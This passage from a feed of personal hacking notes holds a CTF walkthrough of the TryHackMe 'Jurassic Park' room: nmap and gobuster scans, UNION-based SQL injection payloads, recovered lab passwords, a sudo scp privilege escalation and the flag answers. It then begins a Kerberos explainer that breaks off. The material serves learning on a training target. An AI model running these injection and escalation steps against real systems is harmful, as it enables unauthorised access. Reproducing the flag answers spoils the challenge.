|       MSF:ILITIES/UBUNTU-CVE-2018-1302/   4.3 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1301/   4.3 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/   4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/    *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2019-10092/  4.3 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/   *EXPLOIT*
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/    4.3 https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/ *EXPLOIT*
|       MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/    4.3 https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/ *EXPLOIT*
|       CVE-2020-11985  4.3 https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-10092  4.3 https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3 https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3 https://vulners.com/cve/CVE-2018-1301
|       CVE-2018-11763  4.3 https://vulners.com/cve/CVE-2018-11763
|       CVE-2016-4975   4.3 https://vulners.com/cve/CVE-2016-4975
|       CVE-2016-1546   4.3 https://vulners.com/cve/CVE-2016-1546
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3 https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       1337DAY-ID-33575    4.3 https://vulners.com/zdt/1337DAY-ID-33575    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1283/   3.5 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/    *EXPLOIT*
|       MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/ 3.5 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/  *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/   3.5 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/    *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/  3.5 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/   3.5 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/    *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/ 3.5 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/  *EXPLOIT*
|       CVE-2018-1283   3.5 https://vulners.com/cve/CVE-2018-1283
|       CVE-2016-8612   3.3 https://vulners.com/cve/CVE-2016-8612
|       PACKETSTORM:152441  0.0 https://vulners.com/packetstorm/PACKETSTORM:152441  *EXPLOIT*
|_      MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/   0.0 https://vulners.com/metasploit/MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/    *EXPLOIT*
| http-enum: 
|_  /robots.txt: Robots file
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/2%OT=22%CT=1%CU=42651%PV=Y%DS=4%DC=T%G=Y%TM=61FB4F78
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11
OS:NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 0.010 days (since Wed Feb  2 20:30:09 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   35.71 ms  10.13.0.1
2   ... 3
4   170.37 ms 10.10.105.134

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb  2 20:43:52 2022 -- 1 IP address (1 host up) scanned in 915.75 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;SSH and Apache on port 80. Pretty standard. There is an enumerated &lt;code&gt;/robots.txt&lt;/code&gt; file, which turns out to be invalid â it contains only the phrase &quot;Wubbalubbadubdub&quot;.&lt;/p&gt;&lt;p&gt;Let's also hit the target with gobuster:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gobuster&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-t&lt;/span&gt; 50 dir &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-u&lt;/span&gt; http://10.10.105.134 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This reveals some interesting directories:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;/assets&lt;/code&gt; is unsecured and contains site assets, and reveals that we're running Apache 2.4.18 on Ubuntu.&lt;/li&gt;&lt;li&gt;&lt;code&gt;/delete&lt;/code&gt; is a plain text file: &quot;New pric esc for Ubuntu?? Change MySQL password on main system!&quot;&lt;/li&gt;&lt;li&gt;&lt;code&gt;/server-status&lt;/code&gt; is forbidden (which is not surprising).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Out of curiosity, I tried loading &lt;code&gt;/item.php?id=robots.txt&lt;/code&gt; to see if I could get file inclusion without ascending. This doesn't work, but throws another SQL error: &quot;Unknown column 'robots.txt in 'where clause'&quot;. This indicates that we're definitely vulnerable to some kind of injection, since &lt;code&gt;robots.txt&lt;/code&gt; is being treated as a column spec. In fact, this indicates that there must not be any quoting going on at all!&lt;/p&gt;&lt;p&gt;And indeed, trying &lt;code&gt;/item.php?id=0 or 1=1&lt;/code&gt; brings up the same broken page as &lt;code&gt;/item.php?id=100&lt;/code&gt;. So I think what's going on here is that &lt;code&gt;/item.php&lt;/code&gt; is just doing some string filtering (it looks like it's probably also checking if you're trying to include a real file, as attempting to include non-existent files &lt;em&gt;doesn't&lt;/em&gt; trigger it).&lt;/p&gt;&lt;p&gt;What the hell, let's throw SQLMap at it anyway!&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;sqlmap&lt;/span&gt; -u http://10.10.105.134/item.php?id=1 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;--dbms&lt;/span&gt;=mysql --dump-all --batch&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Well, that didn't work.&lt;/p&gt;&lt;p&gt;Meanwhile, futzing around by hand I find that &lt;code&gt;/item.php?id=0 union select null, null, null, null, null&lt;/code&gt; works and displays a slightly &lt;em&gt;different&lt;/em&gt; error page (so, whatever the &lt;code&gt;id&lt;/code&gt; variable is being pushed into must be at the very end of the SQL statement). And, while &quot;&lt;code&gt;'&lt;/code&gt;&quot; triggers the annoying error page, using a double quote (&quot;&lt;code&gt;&quot;&lt;/code&gt;&quot;) does not. Using a bit of trial-and error, we can determine that all but the first of these columns are usable, though the fourth place is easiest to read. This at least let's us figure out our first few flags.&lt;/p&gt;&lt;p&gt;FLAG 1: What is the SQL database called which is serving the shop information? â &lt;code&gt;park&lt;/code&gt;&lt;/p&gt;&lt;p&gt;FLAG 2: How many columns does the table have? â &lt;code&gt;5&lt;/code&gt;&lt;/p&gt;&lt;p&gt;FLAG 3: Whats the system &lt;em&gt;version&lt;/em&gt;? â &lt;code&gt;Ubuntu 16.04&lt;/code&gt;&lt;/p&gt;&lt;p&gt;The database also appears to be running as root. Ruh roh!&lt;/p&gt;&lt;p&gt;Now that we're getting the hang of this, we can extract more information by using queries of the form: &lt;code&gt;/item.php?id=0 union (select null, null, null, &quot;something&quot;, null)&lt;/code&gt;. I'm going to focus on the actual SQL inside of these parenthesis.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode sql&quot;&gt;&lt;code class=&quot;sourceCode sql&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;fu&quot;&gt;count&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;*&lt;/span&gt;), &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;from&lt;/span&gt; mysql.&lt;span class=&quot;fu&quot;&gt;user&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We have four users. We can enumerate them by replacing &lt;code&gt;count(*)&lt;/code&gt; with &lt;code&gt;User&lt;/code&gt; and taking on a &lt;code&gt;limit&lt;/code&gt; clause; this just reveals that the only users are &lt;code&gt;root&lt;/code&gt; and three standard Debian system users that are used for upgrades and maintenance.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode sql&quot;&gt;&lt;code class=&quot;sourceCode sql&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;fu&quot;&gt;count&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;*&lt;/span&gt;), &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-2&quot;&gt;&lt;a href=&quot;#cb6-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;from&lt;/span&gt; information_schema.&lt;span class=&quot;kw&quot;&gt;tables&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This reveals that there are 282 tables managed by this MySQL instance (ouch!). But how many tables are in the &lt;code&gt;park&lt;/code&gt; database (which is what's serving up this site)?&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode sql&quot;&gt;&lt;code class=&quot;sourceCode sql&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;fu&quot;&gt;count&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;*&lt;/span&gt;), &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-2&quot;&gt;&lt;a href=&quot;#cb7-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;from&lt;/span&gt; information_schema.&lt;span class=&quot;kw&quot;&gt;tables&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-3&quot;&gt;&lt;a href=&quot;#cb7-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;where&lt;/span&gt; table_schema &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;ot&quot;&gt;&amp;quot;park&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Only two. That seems much better. I wonder what they are?&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb8&quot;&gt;&lt;pre class=&quot;sourceCode sql&quot;&gt;&lt;code class=&quot;sourceCode sql&quot;&gt;&lt;span id=&quot;cb8-1&quot;&gt;&lt;a href=&quot;#cb8-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, table_name, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-2&quot;&gt;&lt;a href=&quot;#cb8-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;from&lt;/span&gt; information_schema.&lt;span class=&quot;kw&quot;&gt;tables&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-3&quot;&gt;&lt;a href=&quot;#cb8-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;where&lt;/span&gt; table_schema &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;ot&quot;&gt;&amp;quot;park&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-4&quot;&gt;&lt;a href=&quot;#cb8-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;limit&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So we have two tables, &lt;code&gt;items&lt;/code&gt; and &lt;code&gt;users&lt;/code&gt;. Let's see what the columns of the &lt;code&gt;users&lt;/code&gt; table are.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb9&quot;&gt;&lt;pre class=&quot;sourceCode sql&quot;&gt;&lt;code class=&quot;sourceCode sql&quot;&gt;&lt;span id=&quot;cb9-1&quot;&gt;&lt;a href=&quot;#cb9-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, column_name, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-2&quot;&gt;&lt;a href=&quot;#cb9-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;from&lt;/span&gt; information_schema.&lt;span class=&quot;kw&quot;&gt;columns&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-3&quot;&gt;&lt;a href=&quot;#cb9-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;where&lt;/span&gt; table_schema &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;ot&quot;&gt;&amp;quot;park&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-4&quot;&gt;&lt;a href=&quot;#cb9-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;and&lt;/span&gt; table_name &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;ot&quot;&gt;&amp;quot;users&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-5&quot;&gt;&lt;a href=&quot;#cb9-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;limit&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, the columns are &lt;code&gt;id&lt;/code&gt;, &lt;code&gt;username&lt;/code&gt;, and &lt;code&gt;password&lt;/code&gt;. Nice. Let's dig into that table.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb10&quot;&gt;&lt;pre class=&quot;sourceCode sql&quot;&gt;&lt;code class=&quot;sourceCode sql&quot;&gt;&lt;span id=&quot;cb10-1&quot;&gt;&lt;a href=&quot;#cb10-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;password&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-2&quot;&gt;&lt;a href=&quot;#cb10-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;from&lt;/span&gt; park.users&lt;/span&gt;
&lt;span id=&quot;cb10-3&quot;&gt;&lt;a href=&quot;#cb10-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;limit&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Unfortunately, trying to include the &lt;code&gt;username&lt;/code&gt; column triggers the annoying error, so all we can retrieve are two passwords, &lt;code&gt;D0nt3ATM3&lt;/code&gt; and &lt;code&gt;ih8dinos&lt;/code&gt;. Just for grins (and clued in by the structure of the flag questions), let's see if we can SSH into the box as either of these using the user &lt;code&gt;dennis&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;The second works for this purpose, and the first flag is right in &lt;code&gt;dennis&lt;/code&gt;' home directory.&lt;/p&gt;&lt;p&gt;FLAG 4: What is dennis' password? â &lt;code&gt;ih8dinos&lt;/code&gt;&lt;/p&gt;&lt;p&gt;FLAG 5: Locate and get the first flag contents. â &lt;code&gt;b89f2d69c56b9981ac92dd267f&lt;/code&gt;&lt;/p&gt;&lt;p&gt;Poking around a bit, &lt;code&gt;sudo -l&lt;/code&gt; reveals that &lt;code&gt;dennis&lt;/code&gt; can use &lt;code&gt;scp&lt;/code&gt; via &lt;code&gt;sudo&lt;/code&gt;, and the &lt;code&gt;test.sh&lt;/code&gt; file implies that there's a &lt;code&gt;/root/flag5.txt&lt;/code&gt; file. Since &lt;code&gt;scp&lt;/code&gt; works like &lt;code&gt;cp&lt;/code&gt; for local copies, we can grab this.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb11&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb11-1&quot;&gt;&lt;a href=&quot;#cb11-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; scp /root/flag5.txt .&lt;/span&gt;
&lt;span id=&quot;cb11-2&quot;&gt;&lt;a href=&quot;#cb11-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; flag5.txt&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;FLAG 8: Whats the contents of the fifth flag? â &lt;code&gt;2a7074e491fcacc7eeba97808dc5e2ec&lt;/code&gt;&lt;/p&gt;&lt;p&gt;Continuing to poke around, &lt;code&gt;cat .bash_history&lt;/code&gt; reveals the third flag (as well as a lot of &lt;code&gt;scp&lt;/code&gt; attempts around &lt;code&gt;/root/flag5.txt&lt;/code&gt;, which I just got).&lt;/p&gt;&lt;p&gt;FLAG 7: Whats the contents of the third flag? â &lt;code&gt;b4973bbc9053807856ec815db25fb3f1&lt;/code&gt;&lt;/p&gt;&lt;p&gt;The &lt;code&gt;~/.viminfo&lt;/code&gt; file reveals two more potential flags: &lt;code&gt;/boot/grub/fonts/flagTwo.txt&lt;/code&gt; and &lt;code&gt;/tmp/flagFour.txt&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;FLAG 6: Whats the contents of the second flag? â &lt;code&gt;96ccd6b429be8c9a4b501c7a0b117b0a&lt;/code&gt;&lt;/p&gt;&lt;p&gt;But, as the TryHackMe room notes, there is no fourth flag. So actually we're done.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22sqlmap%22.md&quot;&gt;Using &quot;sqlmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/SQL%20Injection.md&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22nmap%22.md&quot;&gt;Using &quot;nmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22gobuster%22.md&quot;&gt;Using &quot;gobuster&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;ELAPSED TIME: 2 h 53 min&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/jurassicpark&quot;&gt;TryHackMe: Jurassic Park&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Jurassic%20Park.md</guid>
		</item>
		<item>
			<title>Kerberos</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Kerberos.md</link>
			<description>&lt;p&gt;Kerberos: The default authentication method for Windows domains. Intended to be the successor to NTLM.&lt;/p&gt;&lt;p&gt;The built-in Windows command &lt;code&gt;klist&lt;/code&gt; will show you the current Kerberos tickets in memory.&lt;/p&gt;&lt;h2 id=&quot;definitions&quot;&gt;Definitions&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;TICKET GRANTING TICKET (TGT): An authentication ticket that can be used to request service tickets for specific domain services from the ticket granting service.&lt;/li&gt;&lt;li&gt;KEY DISTRIBUTION CENTER (KDC): A domain service that issues tickets; typically composed of the ticket granting service and the authentication service.&lt;/li&gt;&lt;li&gt;AUTHENTICATION SERVICE (AS): Issues ticket granting tickets. (Presumably in charge of &lt;em&gt;authenticating&lt;/em&gt; users and automations.)&lt;/li&gt;&lt;li&gt;TICKET GRANTING SERVICE (TGS): Issues tickets for domain services (and machines?) when presented with a ticket granting ticket. (Presumably in charge of &lt;em&gt;authorizing&lt;/em&gt; users and automations.)&lt;/li&gt;&lt;li&gt;SERVICE PRINCIPAL NAME (SPN): A service identifier. On Windows, SPNs associates a particular service instance with a domain account. All services must have a domain service account. (But it sounds like services might be associated with &lt;em&gt;multiple&lt;/em&gt; accounts via multiple principal names assigned to multiple running instances?)&lt;/li&gt;&lt;li&gt;KDC LONG TERM SECRET KEY (KDC LT KEY): A secret key used to encrypt ticket granting tickets and sign privilege attribute certificates. This is the NT hash of the KRBTGT service account.&lt;/li&gt;&lt;li&gt;SERVICE LONG TERM SECRET KEY (SERVICE LT KEY): A secret key associated with a particular service. Used to encrypt the service portion of a service ticket and sign privilege attribute certificates. Held by individual domain service accounts.&lt;/li&gt;&lt;li&gt;SESSION KEY: Issued with a ticket to identify a particular user session. Services expects &lt;em&gt;both&lt;/em&gt; a ticket and a session key to be present before acting on a user's behalf.&lt;/li&gt;&lt;li&gt;PRIVILEGE ATTRIBUTE CERTIFICATE (PAC): A bundle of the user's identifying information, which is provided along with the tickets. Importantly, this contains the user's username and (on Windows) SID.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Note that Active Directory bundles the authentication service, ticket granting service, and KDC into a single &quot;domain controller&quot; role. Non-Windows Kerberos implementations are more likely to separate these roles between different servers.&lt;/p&gt;&lt;h2 id=&quot;authentication-process&quot;&gt;Authentication Process&lt;/h2&gt;&lt;p&gt;The below steps are cut-and-pasted from Wikipedia's walk-through, but with language adapted to match the Windows-specific environment Kerberos is most commonly deployed in. (A close reading of these steps will also explain why it's sometimes said that &quot;a hash is as good as a password&quot; for a Window's domain.)&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Kerberos_%28protocol%29&quot;&gt;Wikipedia: Kerberos (protocol)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;client-authentication-to-the-kdc-aka-pre-authentication&quot;&gt;Client Authentication to the KDC (a.k.a. &quot;Pre-Authentication&quot;)&lt;/h3&gt;&lt;p&gt;(1) AS-REQ: The client sends the client/user ID + the current timestamp (the timestamp is used to prevent replay attacks) encrypted with the NT hash of the user's password + a cleartext message of the user ID to the authentication server to request services on behalf of the user.&lt;/p&gt;&lt;p&gt;(2) AS-REP: The authentication server checks to see if the client/user ID is in its database and if it can decrypt the timestamp using the NT hash of the password stored there. If it can, then the authentication server sends back the following two messages to the client:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Message A: &lt;em&gt;Client/TGS Session Key&lt;/em&gt; encrypted using the NT hash of the client/user.&lt;/li&gt;&lt;li&gt;Message B: &lt;em&gt;Ticket Granting Ticket&lt;/em&gt; (including the privilege attribute certificate, client network address, ticket validity period, and the &lt;em&gt;Client/TGS Session Key&lt;/em&gt;) encrypted using the KDC long term secret 